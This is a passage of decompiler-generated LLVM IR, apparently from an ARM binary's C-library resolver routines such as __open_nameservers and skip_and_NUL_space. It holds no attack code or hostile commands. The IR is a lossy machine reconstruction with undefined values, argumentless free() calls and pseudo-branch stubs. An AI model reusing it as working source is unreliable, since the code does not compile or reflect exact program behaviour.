dec_label_pc_13030:                               ; preds = %dec_label_pc_12eec, %dec_label_pc_12dcc, %dec_label_pc_13008, %dec_label_pc_12f44, %dec_label_pc_12f74, %bb231
  %v1_13034 = call i32 @__GI___libc_close(i32 %v3_12be8)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1303c = icmp eq i32 %arg3, 0
  br i1 %v2_1303c, label %.thread22, label %bb234

bb234:                                            ; preds = %dec_label_pc_13030
  %v1_13044 = load i32, i32* @sl, align 4
  %v3_13040 = inttoptr i32 %arg3 to i32*
  store i32 %v1_13044, i32* %v3_13040, align 4
  br label %bb235

.thread22:                                        ; preds = %dec_label_pc_13030
  br label %bb235

bb235:                                            ; preds = %bb234, %.thread22
  store i32 ptrtoint (i32* @global_var_1304c.480 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1303c, i32 ptrtoint (i32* @global_var_c038.332 to i32))
  store i32 %v1_1296c, i32* @r0, align 4
  %v0_13050 = call i32 @free()
  br label %dec_label_pc_130c8

dec_label_pc_13058:                               ; preds = %thread-pre-split, %dec_label_pc_12c34, %dec_label_pc_12da4, %dec_label_pc_12d9c, %dec_label_pc_12d4c, %dec_label_pc_12d58, %dec_label_pc_12d64thread-pre-split, %thread-pre-split.thread, %dec_label_pc_12d14, %dec_label_pc_12eec, %dec_label_pc_12ee0, %dec_label_pc_12bf8, %dec_label_pc_12bd8, %dec_label_pc_12fd8
  %v1_1305c = add i32 %v0_12afc, 1
  store i32 %v1_1305c, i32* @r5, align 4
  br label %dec_label_pc_13068

dec_label_pc_13068:                               ; preds = %.thread8, %dec_label_pc_13058
  %storemerge23 = phi i32 [ -1, %dec_label_pc_13058 ], [ %v7_12cf8, %.thread8 ]
  %stack_var_-468.2 = phi i32 [ %v1_1305c, %dec_label_pc_13058 ], [ %v0_12afc, %.thread8 ]
  store i32 %storemerge23, i32* @r7, align 4
  %v1_1306c = add i32 %stack_var_-476.1, -1
  store i32 %v1_1306c, i32* @ip, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp236 = icmp slt i32 %v1_1306c, 1
  br i1 %tmp236, label %dec_label_pc_13088, label %dec_label_pc_12a08

dec_label_pc_13080:                               ; preds = %dec_label_pc_12bac, %bb222, %bb217, %.thread6, %dec_label_pc_12988
  br label %dec_label_pc_13088

dec_label_pc_13088:                               ; preds = %dec_label_pc_13068, %.thread134, %dec_label_pc_13080
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_13080 ], [ -1, %.thread134 ], [ %v3_12be8, %dec_label_pc_13068 ]
  %stack_var_-472.1 = phi i32 [ %v1_1296c, %dec_label_pc_13080 ], [ 0, %.thread134 ], [ %v1_1296c, %dec_label_pc_13068 ]
  store i32 61968, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-488.2, i32* @r1, align 4
  %v0_13090 = call i32 @__aeabi_read_tp()
  %v3_13094 = load i32, i32* @global_var_222ac.107, align 4
  store i32 %v3_13094, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1309c = load i32, i32* @r1, align 4
  %v2_1309c = icmp eq i32 %v0_1309c, -1
  store i1 %v2_1309c, i1* %cpsr_c.global-to-local, align 1
  %v7_1309c = icmp eq i32 %v0_1309c, -1
  %v3_130a0 = add i32 %v3_13094, %v0_13090
  %v4_130a0 = inttoptr i32 %v3_130a0 to i32*
  store i32 -1, i32* %v4_130a0, align 4
  br i1 %v7_1309c, label %dec_label_pc_130b0, label %dec_label_pc_130a8

dec_label_pc_130a8:                               ; preds = %dec_label_pc_13088, %dec_label_pc_12d44
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_13088 ], [ %v3_12be8, %dec_label_pc_12d44 ]
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_13088 ], [ %v1_1296c, %dec_label_pc_12d44 ]
  %v1_130ac = call i32 @__GI___libc_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_130b0

dec_label_pc_130b0:                               ; preds = %dec_label_pc_13088, %dec_label_pc_130a8
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_13088 ], [ %stack_var_-472.2, %dec_label_pc_130a8 ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_130b4 = call i32 @free()
  %v0_130b8 = load i32, i32* @sl, align 4
  store i32 %v0_130b8, i32* @r0, align 4
  %v0_130bc = call i32 @free()
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_130c8

dec_label_pc_130c8:                               ; preds = %bb235, %dec_label_pc_130b0
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_130b0 ], [ %v5_12c70, %bb235 ]
  store i32 %v3_12910, i32* @r4, align 4
  store i32 %v6_12910, i32* @r5, align 4
  store i32 %v9_12910, i32* @r6, align 4
  store i32 %v12_12910, i32* @r7, align 4
  store i32 %v15_12910, i32* @r8, align 4
  store i32 %v18_12910, i32* @sb, align 4
  store i32 %v21_12910, i32* @sl, align 4
  store i32 %v24_12910, i32* @fp, align 4
  store i32 %v27_12910, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_1306c, { 1, 2, 0 }
  uselistorder i32 %v1_13014, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_12fc8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_12f84, { 1, 0, 2 }
  uselistorder i32 %v0_12f08, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12eb0, { 1, 0 }
  uselistorder i32 %v5_12e88, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_12e48, { 4, 5, 0, 6, 7, 1, 2, 3, 8, 9, 10, 11 }
  uselistorder i32 %v2_12e44, { 1, 0 }
  uselistorder i32 %v2_12e28, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_12e24, { 1, 0 }
  uselistorder i32 %v1_12e20, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.062, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.365, { 0, 1, 4, 2, 3 }
  uselistorder i32 %v0_12d9c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_12d78, { 1, 0 }
  uselistorder i32 %v3_12d6c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12d6c, { 0, 2, 1 }
  uselistorder i32 %v2_12d60, { 0, 2, 1 }
  uselistorder i1 %v7_12c80, { 1, 0 }
  uselistorder i32 %v1_12c80, { 1, 0 }
  uselistorder i32 %v0_12c80, { 1, 0 }
  uselistorder i32 %v5_12c70, { 1, 2, 4, 3, 0, 5, 6, 7 }
  uselistorder i32 %v0_12c44, { 1, 0 }
  uselistorder i32 %v3_12be8, { 1, 0, 2, 6, 7, 5, 4, 8, 9, 10, 3 }
  uselistorder i32 %v6_12ba0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12b2c, { 0, 1, 5, 4, 3, 2 }
  uselistorder i32 %v3_12b14, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 %v1_12b08, { 1, 0 }
  uselistorder i32 %v0_12afc, { 4, 3, 1, 2, 0 }
  uselistorder i32 %v0_12ab4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_12a20, { 1, 0, 2 }
  uselistorder i1 %v7_12a0c, { 1, 0 }
  uselistorder i32 %v1_12a10, { 0, 2, 1 }
  uselistorder i32 %v2_12dd4, { 1, 0 }
  uselistorder i32 %v1_12cd4, { 2, 0, 1 }
  uselistorder i32 %v2_12b5c, { 1, 0, 2 }
  uselistorder i32 %v2_12b34, { 1, 0 }
  uselistorder i32 %v0_12988, { 1, 0, 2 }
  uselistorder i32 %v1_1296c, { 5, 0, 2, 4, 3, 6, 7, 1, 8, 9 }
  uselistorder i32 %v3_12938, { 6, 1, 3, 2, 4, 5, 0, 7 }
  uselistorder i32 %v0_12924, { 9, 8, 7, 6, 5, 4, 10, 0, 1, 3, 2 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp164, { 1, 0, 2 }
  uselistorder i32 %tmp163, { 8, 7, 6, 0, 5, 2, 3, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 18, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 2, 19, 20, 1, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 55, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 15, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 2, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 23, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 4, 5, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 55, 20, 21, 2, 23, 24, 25, 26, 27, 1, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32 (i32)* @__GI___libc_close, { 2, 1, 3, 4, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 1000, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_send, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 2, 0 }
  uselistorder i32 120, { 0, 2, 3, 4, 5, 10, 9, 8, 6, 1, 7 }
  uselistorder i32 27, { 2, 1, 0 }
  uselistorder i32 12196, { 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_130c8, { 1, 0 }
  uselistorder label %dec_label_pc_130b0, { 1, 0 }
  uselistorder label %dec_label_pc_13088, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13080, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_13068, { 1, 0 }
  uselistorder label %dec_label_pc_13058, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb235, { 1, 0 }
  uselistorder label %dec_label_pc_13030, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_13008, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_12f60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ee0, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_12df4, { 1, 0 }
  uselistorder label %dec_label_pc_12d9c, { 1, 0 }
  uselistorder label %dec_label_pc_12d6c, { 1, 0 }
  uselistorder label %dec_label_pc_12d44, { 1, 0 }
  uselistorder label %dec_label_pc_12c80, { 1, 0, 2 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %dec_label_pc_12adc, { 1, 0 }
  uselistorder label %dec_label_pc_12aa0, { 1, 0 }
  uselistorder label %bb220, { 1, 0 }
}

define i32 @"$d"(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_130d8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_130d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_130d8, label %.thread, label %.thread13

.thread:                                          ; preds = %dec_label_pc_130d8
  %v2_130d8 = load i32, i32* @lr, align 4
  %v4_130d8 = lshr i32 %v2_130d8, %arg2
  %v5_130d8 = sub i32 32, %arg2
  %v6_130d8 = shl i32 %v2_130d8, %v5_130d8
  %v7_130d8 = or i32 %v6_130d8, %v4_130d8
  %v9_130d8 = and i32 %v7_130d8, %tmp
  store i32 %v9_130d8, i32* %r0.global-to-local, align 4
  %v2_130dc = load i32, i32* @ip, align 4
  %v3_130dc = load i32, i32* @sb, align 4
  %v8_130dc = lshr i32 %v2_130dc, %v3_130dc
  %v9_130dc = and i32 %v8_130dc, %v9_130d8
  call void @__pseudo_branch(i32 %v9_130dc)
  %v0_130e0.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_130e0.pr.pr, label %bb, label %.thread..thread13_crit_edge

.thread..thread13_crit_edge:                      ; preds = %.thread
  %v8_13110.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread13

bb:                                               ; preds = %.thread
  %v2_130e4 = load i32, i32* @ip, align 4
  %v3_130f0 = mul i32 %arg2, %arg2
  %v3_130f4 = mul i32 %v3_130f0, %v2_130e4
  store i32 %v3_130f4, i32* %r0.global-to-local, align 4
  %v2_130f8 = trunc i32 %v3_130f4 to i16
  %v4_130f8 = inttoptr i32 %v3_130f4 to i16*
  store i16 %v2_130f8, i16* %v4_130f8, align 2
  %v5_130f8 = load i32, i32* @ip, align 4
  %v6_130f8 = load i32, i32* %r0.global-to-local, align 4
  %v7_130f8 = sub i32 %v6_130f8, %v5_130f8
  %v2_13100 = trunc i32 %v7_130f8 to i16
  %v4_13100 = inttoptr i32 %v7_130f8 to i16*
  store i16 %v2_13100, i16* %v4_13100, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  call void @llvm.trap()
  unreachable

.thread13:                                        ; preds = %.thread..thread13_crit_edge, %dec_label_pc_130d8
  %v8_13110 = phi i32 [ %v8_13110.pre, %.thread..thread13_crit_edge ], [ %tmp, %dec_label_pc_130d8 ]
  ret i32 %v8_13110

; uselistorder directives
  uselistorder i32 %v7_130f8, { 1, 0 }
  uselistorder i32 %v3_130f4, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 196, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13178 = load i32, i32* @r4, align 4
  store i32 %v3_13178, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %ip.global-to-local, align 4
  store i32 196, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_13188.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_131889 = inttoptr i32 %v0_13188.pre to i8*
  %v2_1318810 = load i8, i8* %v1_131889, align 1
  %v2_1318c12 = icmp eq i8 %v2_1318810, 0
  store i1 %v2_1318c12, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1318c12, label %dec_label_pc_131bc, label %dec_label_pc_13198

dec_label_pc_13198:                               ; preds = %entry, %bb8.dec_label_pc_13198_crit_edge
  %v1_13198 = phi i32 [ %v1_13198.pre, %bb8.dec_label_pc_13198_crit_edge ], [ 196, %entry ]
  %v0_13198 = phi i32 [ %v0_13198.pre, %bb8.dec_label_pc_13198_crit_edge ], [ ptrtoint (i32* @global_var_22290.79 to i32), %entry ]
  %v2_1318816 = phi i8 [ %v2_13188, %bb8.dec_label_pc_13198_crit_edge ], [ %v2_1318810, %entry ]
  %v2_1319017.in.in = phi i8 [ %v2_13188, %bb8.dec_label_pc_13198_crit_edge ], [ %v2_1318810, %entry ]
  %v1_1318815 = phi i8* [ %v1_13188, %bb8.dec_label_pc_13198_crit_edge ], [ %v1_131889, %entry ]
  %v2_131b014 = phi i32 [ %v2_131b4, %bb8.dec_label_pc_13198_crit_edge ], [ %v0_13188.pre, %entry ]
  %v2_1319017.in = zext i8 %v2_1319017.in.in to i32
  %v2_1319017 = mul nuw nsw i32 %v2_1319017.in, 2
  %v2_13198 = add i32 %v1_13198, %v0_13198
  %v3_13198 = inttoptr i32 %v2_13198 to i32*
  %v4_13198 = load i32, i32* %v3_13198, align 4
  %v2_1319c = add i32 %v4_13198, %v2_1319017
  %v3_1319c = inttoptr i32 %v2_1319c to i16*
  %v4_1319c = load i16, i16* %v3_1319c, align 2
  %v1_131a0 = and i16 %v4_1319c, 32
  %v2_131a0 = icmp eq i16 %v1_131a0, 0
  store i1 %v2_131a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_131a0, label %dec_label_pc_131bc, label %dec_label_pc_131a8

dec_label_pc_131a8:                               ; preds = %dec_label_pc_13198
  %v7_131a8 = icmp eq i8 %v2_1318816, 35
  br i1 %v7_131a8, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_131a8
  %v8_131ac = icmp eq i8 %v2_1318816, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_131a8, %bb
  %storemerge = phi i1 [ %v8_131ac, %bb ], [ %v7_131a8, %dec_label_pc_131a8 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_131b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_131b0 = trunc i32 %v0_131b0 to i8
  store i8 %v1_131b0, i8* %v1_1318815, align 1
  %v0_131b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_131c0.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_131b4, label %dec_label_pc_131bc, label %bb8

bb8:                                              ; preds = %bb7
  %v2_131b4 = add i32 %v1_131c0.pre, 1
  store i32 %v2_131b4, i32* %r0.global-to-local, align 4
  %v1_13188 = inttoptr i32 %v2_131b4 to i8*
  %v2_13188 = load i8, i8* %v1_13188, align 1
  %v2_1318c = icmp eq i8 %v2_13188, 0
  store i1 %v2_1318c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1318c, label %dec_label_pc_131bc, label %bb8.dec_label_pc_13198_crit_edge

bb8.dec_label_pc_13198_crit_edge:                 ; preds = %bb8
  %v0_13198.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_13198.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13198

dec_label_pc_131bc:                               ; preds = %bb8, %dec_label_pc_13198, %bb7, %entry
  %v1_131c0 = phi i32 [ %v0_13188.pre, %entry ], [ %v1_131c0.pre, %bb7 ], [ %v2_131b014, %dec_label_pc_13198 ], [ %v2_131b4, %bb8 ]
  %v2_131bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_131bc, i32* @r4, align 4
  ret i32 %v1_131c0

; uselistorder directives
  uselistorder i8 %v2_13188, { 2, 1, 0 }
  uselistorder i8* %v1_13188, { 1, 0 }
  uselistorder i32 %v2_131b4, { 0, 2, 3, 1 }
  uselistorder i1 %v2_131a0, { 1, 0 }
  uselistorder i8 %v2_1318816, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 1, 0, 2, 4 }
  uselistorder label %dec_label_pc_131bc, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_13198, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_131cc = load i32, i32* @r4, align 4
  store i32 %v3_131cc, i32* %stack_var_-36, align 4
  %v12_131cc = load i32, i32* @r7, align 4
  %v15_131cc = load i32, i32* @r8, align 4
  %v18_131cc = load i32, i32* @sb, align 4
  %v21_131cc = load i32, i32* @sl, align 4
  %v27_131cc = load i32, i32* @lr, align 4
  store i32 13196, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r5, align 4
  %v4_131dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13196) to i32*), align 4
  store i32 %v4_131dc, i32* @r4, align 4
  %v2_131e0 = icmp eq i32 %v4_131dc, 0
  br i1 %v2_131e0, label %dec_label_pc_131ec, label %dec_label_pc_1321c

dec_label_pc_131ec:                               ; preds = %entry
  %v2_131f0 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_131f0, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37176), i32* %r0.global-to-local, align 4
  %v2_131f8 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37176), i32 %v2_131f0)
  store i32 %v2_131f8, i32* %r0.global-to-local, align 4
  %v2_131fc = icmp eq i32 %v2_131f8, 0
  %v1_13200 = load i32, i32* @r4, align 4
  %.v1_13200 = select i1 %v2_131fc, i32 %tmp38, i32 %v1_13200
  store i32 12224, i32* %r1.global-to-local, align 4
  store i32 %.v1_13200, i32* %r2.global-to-local, align 4
  %v0_1320c = load i32, i32* @r5, align 4
  %v2_1320c = add i32 %v0_1320c, 12224
  %v3_1320c = inttoptr i32 %v2_1320c to i32*
  %v4_1320c = load i32, i32* %v3_1320c, align 4
  store i32 %v4_1320c, i32* %r3.global-to-local, align 4
  %v9_13210 = icmp eq i32 %v4_1320c, %.v1_13200
  br i1 %v9_13210, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_131ec
  store i32 %.v1_13200, i32* %v3_1320c, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_131ec, %bb
  store i32 78364, i32* @lr, align 4
  %v1_13218 = xor i1 %v9_13210, true
  call void @__pseudo_cond_branch(i1 %v1_13218, i32 ptrtoint (i32* @global_var_13628.490 to i32))
  %v0_13220.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1321c

dec_label_pc_1321c:                               ; preds = %entry, %bb58
  %v2_13234 = phi i32 [ ptrtoint (i32* @global_var_22290.79 to i32), %entry ], [ %v0_13220.pre, %bb58 ]
  store i32 13208, i32* %r3.global-to-local, align 4
  %v2_13220 = add i32 %v2_13234, 13208
  %v3_13220 = inttoptr i32 %v2_13220 to i32*
  %v4_13220 = load i32, i32* %v3_13220, align 4
  store i32 %v4_13220, i32* %r3.global-to-local, align 4
  %v2_13224 = icmp eq i32 %v4_13220, 0
  br i1 %v2_13224, label %dec_label_pc_1322c, label %dec_label_pc_135c0

dec_label_pc_1322c:                               ; preds = %dec_label_pc_1321c
  %v4_13234 = add i32 %v2_13234, 702
  %v5_13234 = inttoptr i32 %v4_13234 to i8*
  store i8 5, i8* %v5_13234, align 1
  store i32 -37176, i32* %r0.global-to-local, align 4
  store i32 703, i32* %r3.global-to-local, align 4
  store i32 -37204, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v3_13248 = load i32, i32* @r5, align 4
  %v5_13248 = add i32 %v3_13248, 703
  %v6_13248 = inttoptr i32 %v5_13248 to i8*
  store i8 3, i8* %v6_13248, align 1
  %v0_1324c = load i32, i32* @r5, align 4
  %v1_1324c = load i32, i32* %r0.global-to-local, align 4
  %v2_1324c = add i32 %v1_1324c, %v0_1324c
  store i32 %v2_1324c, i32* @r0, align 4
  %v1_13250 = load i32, i32* %r1.global-to-local, align 4
  %v2_13250 = add i32 %v1_13250, %v0_1324c
  store i32 %v2_13250, i32* @r1, align 4
  %v5_13254 = call i32 @__GI_fopen(i32 %v2_1324c, i32 %v2_13250, i32 3, i32 703)
  store i32 %v5_13254, i32* %r0.global-to-local, align 4
  store i32 %v5_13254, i32* @fp, align 4
  %v2_13258 = icmp eq i32 %v5_13254, 0
  br i1 %v2_13258, label %dec_label_pc_134e4, label %dec_label_pc_1348c

dec_label_pc_13264:                               ; preds = %dec_label_pc_1348c, %dec_label_pc_134c0.backedge
  store i32 %v2_134c0, i32* %r0.global-to-local, align 4
  %v2_13268 = call i32 @skip_and_NUL_space(i8* %v1_13268)
  store i32 %v2_13268, i32* %r0.global-to-local, align 4
  store i32 %v2_13268, i32* @r4, align 4
  %v0_13270 = call i32 @skip_nospace()
  store i32 %v0_13270, i32* %r0.global-to-local, align 4
  %v1_13274 = inttoptr i32 %v0_13270 to i8*
  %v2_13274 = call i32 @skip_and_NUL_space(i8* %v1_13274)
  store i32 %v2_13490, i32* @r1, align 4
  store i32 %v2_13274, i32* @r7, align 4
  %v0_13280 = load i32, i32* @r4, align 4
  store i32 %v0_13280, i32* %r0.global-to-local, align 4
  %v2_13284 = inttoptr i32 %v0_13280 to i8*
  %v3_13284 = call i32 @__GI_strcoll(i8* %v2_13284, i32 %v2_13490)
  store i32 %v3_13284, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_13284, 16777216
  %v1_13288 = sdiv i32 %sext, 16777216
  store i32 %v1_13288, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_13290, label %dec_label_pc_1334c

dec_label_pc_13290:                               ; preds = %dec_label_pc_13264
  %v0_13290 = load i32, i32* @r7, align 4
  store i32 %v0_13290, i32* %r0.global-to-local, align 4
  %v0_13294 = call i32 @skip_nospace()
  %v1_13294 = inttoptr i32 %v0_13294 to i8*
  store i32 %v2_13298, i32* @r4, align 4
  %v0_1329c = load i32, i32* @r6, align 4
  %v1_1329c = trunc i32 %v0_1329c to i8
  store i8 %v1_1329c, i8* %v1_13294, align 1
  %v0_132a0 = load i32, i32* @r6, align 4
  store i32 %v0_132a0, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 %v2_13298, i32* %r0.global-to-local, align 4
  %v4_132ac = call i32 @__GI_memset(i8* %v3_132ac, i32 %v0_132a0, i32 28)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_132b4 = load i32, i32* @r7, align 4
  store i32 %v0_132b4, i32* %r1.global-to-local, align 4
  store i32 %v2_132b8, i32* %r2.global-to-local, align 4
  %v3_132bc = inttoptr i32 %v0_132b4 to i8*
  %v4_132bc = call i32 @inet_pton(i32 10, i8* %v3_132bc, i32 %v2_132b8)
  store i32 %v4_132bc, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_132bc, 1
  br i1 %tmp59, label %dec_label_pc_132cc, label %dec_label_pc_132e8

dec_label_pc_132cc:                               ; preds = %dec_label_pc_13290
  %v0_132cc = load i32, i32* @r7, align 4
  store i32 %v0_132cc, i32* %r1.global-to-local, align 4
  store i32 %v2_132d0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_132d8 = inttoptr i32 %v0_132cc to i8*
  %v4_132d8 = call i32 @inet_pton(i32 2, i8* %v3_132d8, i32 %v2_132d0)
  store i32 %v4_132d8, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_132d8, 1
  br i1 %tmp60, label %dec_label_pc_134c0.backedge, label %dec_label_pc_132e8

dec_label_pc_132e8:                               ; preds = %dec_label_pc_132cc, %dec_label_pc_13290
  %v0_132ec.off0 = phi i16 [ 10, %dec_label_pc_13290 ], [ 2, %dec_label_pc_132cc ]
  store i32 %v2_132e8, i32* %r2.global-to-local, align 4
  store i16 %v0_132ec.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 13208, i32* @r7, align 4
  %v0_132fc = load i32, i32* @r5, align 4
  %v2_132fc = add i32 %v0_132fc, 13208
  %v3_132fc = inttoptr i32 %v2_132fc to i32*
  %v4_132fc = load i32, i32* %v3_132fc, align 4
  store i32 13204, i32* @sl, align 4
  %v1_13304 = add i32 %v4_132fc, 1
  store i32 %v1_13304, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_1330c = mul i32 %v1_13304, 28
  store i32 %v2_1330c, i32* %r1.global-to-local, align 4
  %v2_13310 = add i32 %v0_132fc, 13204
  %v3_13310 = inttoptr i32 %v2_13310 to i32*
  %v4_13310 = load i32, i32* %v3_13310, align 4
  store i32 %v4_13310, i32* %r0.global-to-local, align 4
  %v2_13314 = inttoptr i32 %v4_13310 to i32*
  %v3_13314 = call i32 @realloc(i32* %v2_13314, i32 %v2_1330c)
  store i32 %v3_13314, i32* %r0.global-to-local, align 4
  store i32 %v3_13314, i32* @r6, align 4
  %v2_13318 = icmp eq i32 %v3_13314, 0
